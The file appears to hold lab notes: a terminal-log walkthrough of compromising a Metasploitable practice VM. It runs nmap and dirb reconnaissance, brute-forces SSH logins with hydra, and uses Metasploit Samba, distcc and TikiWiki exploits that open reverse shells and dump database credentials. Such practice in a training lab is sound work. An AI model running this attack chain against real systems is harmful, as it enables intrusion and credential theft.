@@ -1,0 +1,397 @@
+
+
+
+
+
+
+
+                 _                  _       _ _        _     _        __ 
+                | |                | |     (_) |      | |   | |      /_ |
+  _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_ __ _| |__ | | ___   | |
+ | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \  | |
+ | | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __/  | |
+ |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|  |_|
+                             | |                                         
+                             |_|                                         
+
+
+
+
+information gathering
+
+root@intx0x80:~#ip=192.168.207.143
+root@intx0x80:~#echo $ip
+ 
+
+#Nmap
+
+root@intx0x80:~#nmap -sV -O $ip
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.1
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp?
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+8009/tcp open  ajp13?
+8180/tcp open  unknown
+MAC Address: 00:0C:29:39:12:B2 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+root@intx0x80:~# nmap -sV -O --script vuln $ip
+
+
+
+21/tcp   open  ftp         ProFTPD 1.3.1
+|_sslv2-drown:
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+|_sslv2-drown:
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-trace: TRACE is enabled
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+| ssl-dh-params:
+|   VULNERABLE:
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+| ssl-poodle:
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  OSVDB:113251  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the "POODLE" issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       http://osvdb.org/113251
+|       https://www.openssl.org/~bodo/ssl-poodle.pdf
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+|_      https://www.imperialviolet.org/2014/10/14/poodle.html
+|_sslv2-drown:
+8009/tcp open  ajp13?
+8180/tcp open  unknown
+|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+|_http-vuln-wnr1000-creds: ERROR: Script execution failed (use -d to debug)
+MAC Address: 00:0C:29:39:12:B2 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 992.54 seconds
+root@intx0x80:~#
+
+
+
+
+
+
+
+
+
+
+
+root@intx0x80:~# dirb http://192.168.207.143 -r
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Sep 26 18:45:02 2017
+URL_BASE: http://192.168.207.143/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.207.143/ ----
++ http://192.168.207.143/cgi-bin/ (CODE:403|SIZE:331)
++ http://192.168.207.143/index (CODE:200|SIZE:45)
++ http://192.168.207.143/index.html (CODE:200|SIZE:45)
++ http://192.168.207.143/phpinfo (CODE:200|SIZE:47593)
++ http://192.168.207.143/phpinfo.php (CODE:200|SIZE:47406)
++ http://192.168.207.143/server-status (CODE:403|SIZE:336)
+==> DIRECTORY: http://192.168.207.143/twiki/--->
+
+-----------------
+END_TIME: Tue Sep 26 18:45:15 2017
+DOWNLOADED: 4612 - FOUND: 6
+
+
+
+
+
+
+#Samba
+
+root@intx0x80:~# enum4linux $ip
+
+
+
+[+] Attempting to map shares on 192.168.207.143
+//192.168.207.143/print$        Mapping: DENIED, Listing: N/A
+//192.168.207.143/tmp   Mapping: OK, Listing: OK --------------------->Writeable
+//192.168.207.143/opt   Mapping: DENIED, Listing: N/A
+//192.168.207.143/IPC$  [E] Can't understand response:
+WARNING: The "syslog" option is deprecated
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
+//192.168.207.143/ADMIN$        Mapping: DENIED, Listing: N/A
+
+
+
+
+
+
+#Brute-force
+root@intx0x80:~#hydra -C pass $ip ssh
+
+
+[22][ssh] host: 192.168.207.143   login: user   password: user
+[22][ssh] host: 192.168.207.143   login: klog   password: 123456789
+[22][ssh] host: 192.168.207.143   login: sys   password: batman
+[22][ssh] host: 192.168.207.143   login: msfadmin   password: msfadmin
+
+
+
+
+#search for vulnerable Services exploit 
+
+
+
+root@intx0x80:~# searchsploit Samba |grep -i "3."|grep "remote"|grep "linux"
+Samba 2.2.x - Buffer Overflow                                                                                   | /linux/remote/7.pl
+Samba 2.2.8 - Remote Code Execution                                                                             | /linux/remote/10.c
+Samba 2.2.8 - (Brute Force Method) Remote Command Execution                                                     | /linux/remote/55.c
+Samba 3.0.4 SWAT - Authorisation Buffer Overflow                                                                | /linux/remote/364.pl
+Samba < 3.0.20 - Remote Heap Overflow                                                                           | /linux/remote/7701.txt
+Samba 2.2.x - nttrans Overflow (Metasploit)                                                                     | /linux/remote/9936.rb
+Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                              | /linux/remote/9950.rb
+Samba 2.2.2 < 2.2.6 - nttrans Buffer Overflow (Metasploit)                                                      | /linux/remote/16321.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                          | /linux/remote/16859.rb
+Samba 1.9.19 - Long Password Buffer Overflow                                                                    | /linux/remote/20308.c
+Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                     | /linux/remote/21850.rb
+Samba 3.3.5 - Format String / Security Bypass                                                                   | /linux/remote/33053.txt
+Samba 3.4.5 - Symlink Directory Traversal (Metasploit) --------------->                                         | /linux/remote/33598.rb
+Samba 3.4.5 - Symlink Directory Traversal                                                                       | /linux/remote/33599.txt
+Samba 3.5.11/3.6.3 - Unspecified Remote Code Execution
+
+
+root@intx0x80:~# searchsploit Samba |grep "3."|grep "remote"|grep "unix"
+Samba - 'Username' map script' Command Execution (Metasploit)  ------>                                          | /unix/remote/16320.rb
+Samba 2.0.7 SWAT - Logging Failure                                                                              | /unix/remote/20340.c
+Samba 2.0.x/2.2 - Arbitrary File Creation                                                                       | /unix/remote/20968.txt
+Samba SMB 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                     | /unix/remote/22356.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                      | /unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                      | /unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                      | /unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)    
+
+
+
+
+#Exploit
+
+
+1-Samba
+
+
+
+msf exploit(usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.207.143  yes       The target address
+   RPORT  139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(usermap_script) > set LHOST 192.168.207.132
+LHOST => 192.168.207.132
+msf exploit(usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 192.168.207.132:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo x47zI5UJKFpcmWwu;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "x47zI5UJKFpcmWwu\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.207.132:4444 -> 192.168.207.143:41530) at 2017-09-26 19:02:54 +0300
+
+id
+uid=0(root) gid=0(root)
+
+
+
+
+
+
+#distcc
+
+
+root@intx0x80:~# searchsploit distcc
+------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                                                                       |  Path
+                                                                                                                                     | (/usr/share/exploitdb/platforms)
+------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
+DistCC Daemon - Command Execution (Metasploit) (1)                                                                                   | /multiple/remote/9915.rb
+DistCC Daemon - Command Execution (Metasploit) (2)                                                                                   | /linux/remote/16919.rb
+------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
+
+
+
+
+
+
+msf exploit(distcc_exec) > show options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.207.143  yes       The target address
+   RPORT  3632             yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.207.132  yes       The listen address
+   LPORT  4443             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(distcc_exec) > exploit
+
+[*] Started reverse TCP double handler on 192.168.207.132:4443
+[*] 192.168.207.143:3632 - The remote distccd did not reply to our request
+[*] Exploit completed, but no session was created.
+msf exploit(distcc_exec) > run
+
+[*] Started reverse TCP double handler on 192.168.207.132:4443
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo VS4sThZoNvKqYbVD;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "VS4sThZoNvKqYbVD\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (192.168.207.132:4443 -> 192.168.207.143:58013) at 2017-09-26 19:14:25 +0300
+[*] 192.168.207.143:3632 - The remote distccd did not reply to our request
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+
+#tikiwiki 
+
+exploit/unix/webapp/tikiwiki_graph_formula_exec
+
+
+msf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.207.143
+RHOST => 192.168.207.143
+msf exploit(tikiwiki_graph_formula_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.207.132:4444
+[*] Attempting to obtain database credentials...
+[*] The server returned            : 200 OK
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] TikiWiki database informations :
+
+db_tiki   : mysql
+dbversion : 1.9
+host_tiki : localhost
+user_tiki : root
+pass_tiki : root
+dbs_tiki  : tikiwiki195
+
+[*] Attempting to execute our payload...
+[*] Sending stage (33986 bytes) to 192.168.207.143
+[*] Meterpreter session 3 opened (192.168.207.132:4444 -> 192.168.207.143:33420) at 2017-09-26 19:56:59 +0300
+
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter >
+
+
+
